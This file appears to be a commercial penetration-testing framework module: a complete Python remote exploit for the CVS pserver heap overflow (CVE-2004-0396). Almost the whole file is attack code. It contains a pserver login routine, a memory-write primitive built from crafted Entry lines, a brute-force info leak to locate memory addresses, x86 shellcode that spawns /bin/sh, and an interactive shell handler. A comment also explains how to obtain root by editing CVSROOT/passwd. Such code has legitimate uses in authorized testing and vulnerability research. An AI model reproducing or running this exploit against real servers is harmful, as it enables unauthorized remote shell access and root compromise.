#! /usr/bin/env python
# cvs pserverd

#CATWALK

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys, struct
sys.path.append(".")
sys.path.append("../../")

import select
import os
import getopt
import socket
import time

NOTES=""" 
This overflow impacts CVS feature versions 1.12.7 and earlier, and
stable versions
1.11.15 (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0396). 

ab note: cvsd running as root setuid's to login user .. so if you add a
root:cryptpass combo to the CVSROOT/passwd file .. then re-own for the
root user .. will get you a root shell. \o/

"""

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="nongnu.org"
DOCUMENTATION["Date public"]="03/2004"
DOCUMENTATION["CERT Advisory"]=""
DOCUMENTATION["CVE Name"] = "CVE-2004-0396"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0396"
DOCUMENTATION['CVSS'] = 7.5
DOCUMENTATION["Notes"]=NOTES
DESCRIPTION="CVS pserverd heap overflow"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux", "i386", "_all"], ["_FreeBSD"], ["_HP-UX"], ["_SCO"] ]

NAME="CVS pserverd"
VERSION="1.0"

from encoder import chunkedaddencoder
from shellcode import linuxshell, shellcodeGenerator
from MOSDEF import mosdef
from tcpexploit import tcpexploit
from exploitutils import *
from libs.ctelnetlib import Telnet


FOLDERNAME = "cvs-serv30903"
cmdline=0
    
# From cvs source
class cvserror(Exception):

        def __init__(self, value):
                self.value = value
                
        def __str__(self):
                return repr(self.value)
class cvslib:
    shift= [
        0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14, 15,
        16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31,
        114,120, 53, 79, 96,109, 72,108, 70, 64, 76, 67,116, 74, 68, 87,
        111, 52, 75,119, 49, 34, 82, 81, 95, 65,112, 86,118,110,122,105,
        41, 57, 83, 43, 46,102, 40, 89, 38,103, 45, 50, 42,123, 91, 35,
        125, 55, 54, 66,124,126, 59, 47, 92, 71,115, 78, 88,107,106, 56,
        36,121,117,104,101,100, 69, 73, 99, 63, 94, 93, 39, 37, 61, 48,
        58,113, 32, 90, 44, 98, 60, 51, 33, 97, 62, 77, 84, 80, 85,223,
        225,216,187,166,229,189,222,188,141,249,148,200,184,136,248,190,
        199,170,181,204,138,232,218,183,255,234,220,247,213,203,226,193,
        174,172,228,252,217,201,131,230,197,211,145,238,161,179,160,212,
        207,221,254,173,202,146,224,151,140,196,205,130,135,133,143,246,
        192,159,244,239,185,168,215,144,139,165,180,157,147,186,214,176,
        227,231,219,169,175,156,206,198,129,164,150,210,154,177,134,127,
        182,128,158,208,162,132,167,209,149,241,153,251,237,236,171,195,
        243,233,253,240,194,250,191,155,142,137,245,235,163,242,178,152
        ]

    def __init__(self, ip="", port="", socket=None):
        self.host=ip
        self.port=port
        self.s=socket

    def cvs_login(self, user, passwd, cvs):
        host = self.host
        port= self.port
        #self.s = self.gettcpsock()
        self.s.connect((host, port))
        login_req = "BEGIN AUTH REQUEST\n" 
        login_req += cvs + "\n"
        login_req += user + "\n"
        login_req += self.scramble(passwd) + "\n"
        login_req += "END AUTH REQUEST\n"
        
        self.s.send(login_req)
        resp = self.s.recv(200)    
        if resp != "I LOVE YOU\n":
            d=resp.find("\n")
            raise cvserror("cvs authentication: %s" % resp[:d])

    # from cvs spec (http://www.elegosoft.com/cvs/cvsclient.html)
    # "This is only to prevent inadvertent compromise; it provides no protection 
    #  against even a relatively unsophisticated attacker."
    def scramble(self, passwd):
        ultraencrypted=""
        for a in range(0, len(passwd)):
            ultraencrypted+= chr(self.shift[ ord(passwd[a])])
        return "A" + ultraencrypted

    # sendcommand set self.response with the response buffer
    def sendcommand(self, command): # add a \n at the end of the command
        self.s.send(command)
        self.response=""
        while 1:
            tmp= self.s.recv(16000)
            if not tmp:
                raise cvserror("Write4: Didn't receive any data")
            self.response+=tmp
            if tmp.find("ok") > -1:
                return "ok"
            if tmp.find("error\n") > -1:
                raise cvserror("cvs protocol error: %s" % tmp)
        
    def getresponse(self):
            return self.response

    def close(self):
            self.s.close()

class CVSpserverdLinux(tcpexploit):
    def __init__(self ): #, shellcode):
        self.brute = 1
        self.debug = 0
        self.exploiting = 0
        self.exploitsock = 0
        self.repeat= 0x2000
        return 
                
    def test(self):
            try:
                    self=self.Write4(0xbfffff10L, 0xbfffff10L)
            except:
                    return 0
            return 1

    def dorun(self):
            host = self.target.interface
            port = self.argsDict["port"]
            user = self.argsDict["user"]
            password = self.argsDict["password"]
            helperhost = self.argsDict["helperhost"]
            
            self.setInfo("%s attacking %s:%d (in progress)" % (NAME, host, port))
            try:
                    c=cvslib(host, port, self.gettcpsock())
                    c.cvs_login(user, password, helperhost)
            except cvserror, msg:
                    self.setInfo("%s attacking %s:%d (failed)" % (NAME, host, port))
                    self.log("CVS pserverd Failed: %s" % str(msg))
                    return 0   
            self.repeat = 4
            shell = self.exploitThroughKnowledge()
            if shell:
                    return shell

            # actual self.repeat control here            
            self.repeat = 0x2000
            
            try:
                    tmp=self.InfoLeak()
            except self.error, msg:
                    self.log("Info Leak failed: %s" % str(msg))
                    return 0        
        
        
            self.log("3# - Exploiting")
            shell=None
            try:
                    shell=self.exploitIT( tmp[0], tmp[1], tmp[2])
            except self.error,msg :
                    self.setInfo("%s attacked %s:%d (failed!)" % (NAME, host, port))
                    self.log("ExploitIT failed: %s " % str(msg) )
                    return 0
        
            self.log("Exploit succeeded!")
            self.setInfo("%s attacked %s:%d (succeeded!)" % (NAME, host, port))
            return shell

    def exploitThroughKnowledge(self):
            kprim = self.target.get_knowledge("CVS addresses")
            if kprim != None:
                    (func_pointer,shellcode_addr, offset)=kprim.known
                    self.debuglog("Trying exploit with knowledge's saved addresses: 0x%08x with shellcode: 0x%08x (offset: 0x%08x)" % (func_pointer, shellcode_addr, offset))

                    try:
                            self.exploitIT(func_pointer, shellcode_addr, offset)
                    except self.error,msg :
                            pass
            else:
                    return 0
            return 1
            
    def exploitIT(self, func_pointer , shellcode_addr, offset):
        self.exploiting = 1
        extra="Max-dotdot\n"
        extra +="Case\n"
        extra +="Set p=d\n"
        extra +="UseUnchanged\n"
        extra +="Global_option -n\n"
        extra +="Gssapi-encrypt\n"
        extra +="Update-prog x\n"
                
        before="A" * offset + self.shellcode + \
              "A" * (0x8000-offset-len(self.shellcode))+"\n"

        for a in range(0, self.repeat, 4):
            #if self.ISucceeded():
            #    return 1
            if self.getState() == self.HALT:
                self.raiseError("Exploit halted by user")
            
            if not allowAddress(func_pointer+a, [0x0a, 0x0]):
                continue

            try:
                self.debuglog("Trying exploit with func_pointer: 0x%08x with shellcode: 0x%08x" % (func_pointer+a,shellcode_addr))
                try:
                        tmp=self.Write4( func_pointer+a,shellcode_addr,before=before,  after=extra, timeout=1, debug=0)
                except:
                        continue
                try:
                    #if self.ISucceeded():
                    #        self.target.add_knowledge("CVS addresses", ( func_pointer+a,shellcode_addr, offset), 100)
                    #        return 1
                    
                    ## tmp is response, check last char received
                    check = tmp[len(tmp)-1:]
                    if check.find("G") >= 0:
                        ##print "Success ! (halted)"
                        ##sys.stdin.read(1)
                        print "GOT IT! UNIX Shell Mode .."
                        telnetshell=Telnet()
                        telnetshell.sock=self.exploitsock
                        return telnetshell
                except:
                    self.exploitsock.close()
                    pass
            except timeoutsocket.Timeout:
                pass
            except cvserror:
                pass
            time.sleep(0.4)
        self.raiseError("Exploit failed")

    def InfoLeak(self):
        CODE= 0x80bb110
        OFFSET=0x300
        before="A" * 0x8000 + "\n"
        self.log("#1 - Finding .data ")
        for a in range(0, 200,1):
            try:
                if not allowAddress(CODE+(a*0x1000), [0x0a, 0x0]):
                    continue

                self.debuglog(" [*] 0x%08x " % (CODE+(a*0x1000)) )
                
                tmp=self.Write4(CODE+(a*0x1000), 0xbfffff10L, timeout=1)
                break
            except cvserror, msg:
                pass
            except timeoutsocket.Timeout:
                pass

            time.sleep(0.5)

        if a == 200:            
            self.raiseError("Coudln't get .data [pserver doesn't seems to be vulnerable]")

        data= CODE + (a*0x1000)
        self.log("     .data found at: %08x" % data) 
        self.nextProgress()
        self.log("2# - Finding a place to put our shellcode (through memory leak)")
        shellcode_addr=0

        extra ="Max-dotdot\n"
        extra +="Case\n"
        extra +="Set p=d\n"
        extra +="UseUnchanged\n"
        extra +="Global_option -n\n"
        extra +="Gssapi-encrypt\n"
        extra +="Update-prog x\n"

        for a in range(1, 400):
            
            if self.getState() == self.HALT:
                self.raiseError("Exploit halted by user")
                
            self.debuglog(" [*] looking for shellcode at: 0x%08x" % ( data+(a*0x4000)))
            try:
                    tmp=self.Write4( data+(a*0x4000), 0xbfffff10L, before=before,after=extra , debug=0)
            except:
                    continue
            idx=tmp.find("`")+1
            end=tmp[idx:].find("'")
            tmp=tmp[idx: idx+end]
            for off in range(0, len(tmp)):
                if tmp[off] != 'A':
                    shellcode_addr=data + (a*0x4000) 
                    self.nextProgress()
                    self.log("     Shellcode at: 0x%08x" % shellcode_addr)
                    return (data+OFFSET, shellcode_addr, off)

        self.raiseError("Couldn't find a place to put our shellcode")
           
    def Write4(self, where, what, before="", after="", timeout=None, debug=0):

        port = self.argsDict["port"]
        host = self.target.interface
        user = self.argsDict["user"]
        password = self.argsDict["password"]
        helperhost = self.argsDict["helperhost"]
        
        c=cvslib(host, port, self.gettcpsock())
        
        c.cvs_login(user, password, helperhost)
        
        if timeout:
            c.s.set_timeout(timeout)

        self.build_attack(where, what, before=before, after=after)

        debug=0
        if debug:
            self.debuglog("- Press a key to continue (attach to cvs) -")
            sys.stdin.read(1)
            
        #self.s.send(self.attackbuf)
        #resp=""
        #while 1:
        #    tmp= self.s.recv(16000)
        #    if not tmp:
        #        self.raiseError("Write4: Didn't receive any data")
        #    resp+=tmp
        #    if tmp.find("ok") > -1:
        #        break
        #    if tmp.find("error\n") > -1:
        #        break
        #self.s.close()
        #return resp
        c.sendcommand(self.attackbuf)
        if self.exploiting:
                self.exploitsock = c.s
        else:
                c.close()
        return c.getresponse()

    def build_attack(self, where, what, before, after):
        helperhost = self.argsDict["helperhost"]
        
        self.attackbuf  = "Root " + helperhost + "\n"
        self.attackbuf += "Directory " + FOLDERNAME + "\n"
        self.attackbuf += helperhost + "\n"

        self.attackbuf += "Entry /xxx/xxx/"
        self.attackbuf += "@" * 24
        self.attackbuf += struct.pack("<L", 0xfffffff0L)
        self.attackbuf += struct.pack("<L", 0xfffffff0L)        
        self.attackbuf += struct.pack("<L", where-12)
        self.attackbuf += struct.pack("<L", what)
        self.attackbuf += "A" * (6*4)
        self.attackbuf += "\n"
        self.attackbuf += "Set ZZZZZZZZZZ=B\n"
        self.attackbuf += before

        i = 0
        while i < 39:
            self.attackbuf += "Is-modified xxx" + "\n"
            i += 1
        self.attackbuf+="noop\n"
        self.attackbuf += after            

class theexploit(CVSpserverdLinux):
    LINUX=1
    def __init__(self):
        tcpexploit.__init__(self)
        self.setPort(2401)
        self.setHost("")
        self.setVersion(0)
        self.version=1        
        self.helperhost = ""
        self.badstring="\x00\r\n"
        self.setVersions()
        self.shellcode = "A"
        self.brute = 1
        self.debug = 0
        self.username="anoncvs"
        self.password=""
        self.name=NAME
        self.supportedNodeArgs=[["LocalNode","linuxNode","win32Node"]]

        return 

    def setVersions(self):
        self.versions={}
        self.versions[0]=("N/A", None)
        self.versions[self.LINUX]=("Linux", None)
        
    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s" % (v,self.versions[v][0])
        
    def createShellcode(self):
        if self.version== self.LINUX:
            before  = mosdef.assemble("jmp $0xc", "X86")
            before += "C"*12
            shell = """
            confirm:
            // sends a little confirm to stdout
            xorl %eax,%eax
            xorl %ebx,%ebx
            incl %ebx
            pushl $0x47474747
            movl %esp,%ecx
            xorl %edx,%edx
            incl %edx
            movb $4,%al
            int $0x80
            shell:
            // execve("/bin/sh", { "/bin/sh", NULL }, NULL)
            xorl %eax,%eax
            pushl %eax
            pushl $0x68732f2f
            pushl $0x6e69622f
            movl %esp,%ebx
            pushl %eax
            push %ebx
            movl %esp,%ecx
            xorl %edx,%edx
            movb $11,%al
            int $0x80
            end:
            """
            shell = mosdef.assemble(shell, "X86")
            self.shellcode= before+shell
            print "shellcode len: %d bytes"%len(self.shellcode)

            return self.shellcode
            
    def neededListenerTypes(self):
        return []

    def run(self):
        self.host = self.target.interface
        self.port = self.argsDict["port"]

        if self.version == self.LINUX:
            CVSpserverdLinux.__init__(self)
            shell = self.dorun()

            # cmdline mode (just for this exploit .. not generic :/)
            if hasattr(self, 'cmdline') and self.cmdline:
                return shell

            # return failure
            elif shell in [0, 1, None]:
                return shell

            # init node
            else:

                # return unix shell node for gui
                shell.write("/bin/sh -i\n")
                import unixShellNode
                from shelllistener import shelllistener                                        
                from shelllistener import shellfromtelnet  
                node = unixShellNode.unixShellNode()
                node.parentnode = self.argsDict["passednodes"][0]
                node.shell = shelllistener(shellfromtelnet(shell))

                return node
 
def usage(app):
    print "Usage: " + sys.argv[0] + " -t target -u username -z password -c cvs_repository"
    print "Example: ./exploits/pserverd/pserverd.py -v 1 -t TARGETHOST -u anoncvs -z anoncvs -c /usr/local/cvsroot"
    app.displayVersions()
        
if __name__ == '__main__':

    app = theexploit()
    cmdline=1
    try:
        (opts,args) = getopt.getopt(sys.argv[1:],"Tt:p:u:z:l:c:d:v:")
    except getopt.GetoptError:
        usage(app)

    host = ""
    targetport = 2401
    cvs="/usr/local/cvsroot"
    localhost=""
    localport=5555
    username="anoncvs"
    password=""
    i=0
    app.setVersions()

    for o,a in opts:
        if o in ["-t"]:
            i+=1
            host=a
        if o in ["-p"]:
            targetport=a
        if o in ["-u"]:
            username=a
        if o in ["-z"]:
            password=a
        if o in ["-c"]:
            cvs=a
        if o in ["-d"]:
            localport = a
        if o in ["-l"]:
            localhost = a
        if o in ["-v"]:
            i+=1
            app.setVersion(int(a))

    if i<2:
        usage(app)
    from hostKnowledge import *
    from listenerLine import *
    from localNode import *
    app.target=hostKnowledge(host,None)
    argsDict={}
    argsDict["port"]=int(targetport)
    argsDict["helperhost"]=cvs
    argsDict["user"]=username
    argsDict["password"]=password
    argsDict["passednodes"]=[localNode()]
    app.callback=fakeListenerLine(localhost,localport)
    app.cmdline = 1

    app.argsDict=argsDict
    app.createShellcode()
    app.setHelperHost(cvs)
    shell = app.run()
    if shell not in [0, 1, None]:
        print "Handling shell .."
        shell.write("/bin/sh -i\n")
        shell.interact()
    
